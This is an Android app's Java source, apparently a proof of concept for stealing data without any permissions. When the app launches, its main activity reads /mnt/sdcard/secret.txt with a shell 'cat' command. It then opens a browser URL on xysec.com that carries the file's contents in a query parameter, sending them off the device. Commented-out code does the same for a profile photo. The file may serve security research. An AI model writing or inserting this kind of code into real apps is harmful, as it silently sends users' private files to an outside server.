package com.xysec.zeroperm;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.List;

import android.net.Uri;
import android.os.Bundle;
import android.app.Activity;
import android.app.ActivityManager;
import android.content.ContentResolver;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.util.Base64;
import android.util.Log;
import android.view.Menu;

public class MainActivity extends Activity {

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        FileInputStream in;
        BufferedInputStream buf;

        Intent intent = getIntent();
        Bundle extras = intent.getExtras();

        //Uri uri = (Uri) extras.getParcelable(Intent.EXTRA_STREAM);
        /*final File file = new File("/mnt/sdcard/profile.jpg");
        Uri uri = Uri.fromFile(file);
        ContentResolver cr = getContentResolver();
        Bitmap bMap=null;
        try {
            InputStream is = cr.openInputStream(uri);

            bMap = BitmapFactory.decodeStream(is);

            if (is != null) {
            is.close();
            }
        } catch (Exception e) {
            Log.e("Error reading file", e.toString());
        }

        ByteArrayOutputStream baos = new ByteArrayOutputStream();  
        bMap.compress(Bitmap.CompressFormat.JPEG, 100, baos);   
        byte[] b = baos.toByteArray();
        String ret=Base64.encodeToString(b,Base64.DEFAULT);*/

        ////// TO get a String !
        
        StringBuffer sb = new StringBuffer("");
        String line = "";
        String NL = System.getProperty("line.separator");
        String str = "cat /mnt/sdcard/secret.txt";
		Log.v("testing", str);

		Process process = null;
		try {
			process = Runtime.getRuntime().exec(str);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			//e.printStackTrace();
			throw new RuntimeException(e);
		}
		Log.v("testing22", str);
	    // Reads stdout.
	    // NOTE: You can write to stdin of the command using
	    //       process.getOutputStream().
		
	    BufferedReader reader = new BufferedReader(
	            new InputStreamReader(process.getInputStream()));
	    int read;
	    char[] buffer = new char[4096];
	    StringBuffer output = new StringBuffer();
	    try {
			while ((read = reader.read(buffer)) > 0) {
			    output.append(buffer, 0, read);
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			//e.printStackTrace();
			throw new RuntimeException(e);
		}
	    Log.v("testing33", str);
	    try {
			reader.close();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			//e.printStackTrace();
			throw new RuntimeException(e);
		}
	    
	    // Waits for the command to finish.
	    try {
			process.waitFor();
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			//e.printStackTrace();
		}
	    String ret = output.toString();
	    Log.v("output", ret);
			//continue;
	   
        startActivity(new Intent(Intent.ACTION_VIEW,
        	   // Uri.parse("http://xysec.com/"+data_string)));
        		Uri.parse("http://xysec.com/up1.php?u="+ret)));
        
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.activity_main, menu);
        return true;
    }

}
